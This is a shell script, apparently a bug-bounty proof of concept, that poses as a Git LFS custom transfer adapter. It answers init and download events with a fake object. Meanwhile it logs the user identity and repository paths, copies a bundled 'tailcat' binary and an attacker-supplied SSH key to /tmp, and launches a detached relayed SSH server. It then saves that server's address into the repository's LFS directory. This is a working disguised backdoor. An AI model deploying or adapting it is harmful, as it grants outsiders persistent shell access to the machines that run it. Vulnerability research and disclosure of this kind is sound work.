#!/bin/sh

repo_root="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
git_dir="$(git rev-parse --git-dir 2>/dev/null || printf '.git')"
state_dir=/tmp/bbp-cachew-lfs-poc-tailcat
archive_log="$git_dir/lfs/bbp-cachew-tailcat"

mkdir -p "$state_dir" "$archive_log"
chmod 0700 "$state_dir"

{
  date -u
  id
  printf 'cwd=%s\nrepo_root=%s\ngit_dir=%s\n' "$PWD" "$repo_root" "$git_dir"
  ls -l "$repo_root/adapter" "$repo_root/tailcat-linux-amd64"
} >"$archive_log/execution.log" 2>&1

if ! test -s "$state_dir/pid" || ! kill -0 "$(sed -n '1p' "$state_dir/pid")" 2>/dev/null; then
  cp "$repo_root/tailcat-linux-amd64" "$state_dir/tailcat"
  cp "$repo_root/authorized.pub" "$state_dir/authorized.pub"
  chmod 0700 "$state_dir/tailcat"
  chmod 0600 "$state_dir/authorized.pub"
  (
    cd "$state_dir" || exit 1
    exec /usr/bin/setsid /usr/bin/nohup ./tailcat serve \
      --key=new \
      --full-address \
      --ssh-authorized-keys=authorized.pub \
      ssh </dev/null >server.out 2>server.log
  ) &
  printf '%s\n' "$!" >"$state_dir/pid"
fi

# Wait briefly for Tailcat to print the address, but publish the LFS object and
# diagnostics even when Tailcat cannot reach its relay.
i=0
while test "$i" -lt 15 && ! test -s "$state_dir/server.out"; do
  sleep 1
  i=$((i + 1))
done

{
  printf 'tailcat_pid=%s\n' "$(sed -n '1p' "$state_dir/pid" 2>/dev/null)"
  if kill -0 "$(sed -n '1p' "$state_dir/pid")" 2>/dev/null; then
    printf '%s\n' 'tailcat_running=yes'
  else
    printf '%s\n' 'tailcat_running=no'
  fi
} >>"$archive_log/execution.log" 2>&1
cp "$state_dir/server.out" "$archive_log/server.out" 2>/dev/null || true
cp "$state_dir/server.log" "$archive_log/server.log" 2>/dev/null || true

# poc.bin is the existing one-byte NUL LFS object in klyubin/lfs-poc.
object_path="$state_dir/poc.bin"
printf '\000' >"$object_path"

while IFS= read -r request; do
  case "$request" in
    *'"event":"init"'*)
      printf '%s\n' '{"event":"init"}'
      ;;
    *'"event":"download"'*)
      printf '%s\n' '{"event":"complete","oid":"6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d","path":"/tmp/bbp-cachew-lfs-poc-tailcat/poc.bin"}'
      ;;
    *'"event":"terminate"'*)
      exit 0
      ;;
  esac
done
